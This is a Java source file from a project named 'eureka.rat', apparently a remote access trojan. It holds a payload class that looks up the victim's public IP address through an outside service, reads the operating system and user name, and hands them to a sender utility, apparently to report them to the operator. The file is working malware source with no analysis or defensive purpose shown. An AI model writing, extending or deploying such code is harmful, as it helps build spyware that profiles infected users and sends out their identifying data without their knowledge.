package eureka.rat.features;

import eureka.rat.utils.Sender;
import eureka.rat.utils.Message;
import eureka.rat.payloads.Payload;

import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.Scanner;

public class User implements Payload {
    @Override
    public void execute() throws Exception {
        String ip = new Scanner(new URL("http://checkip.amazonaws.com").openStream(), StandardCharsets.UTF_8).useDelimiter("\\A").next();

        Sender.send(new Message.Builder("Personal")
                .addField("IP", ip, true)
                .addField("OS", System.getProperty("os.name"), true)
                .addField("Name", System.getProperty("user.name"), true)
                .build());
    }
}
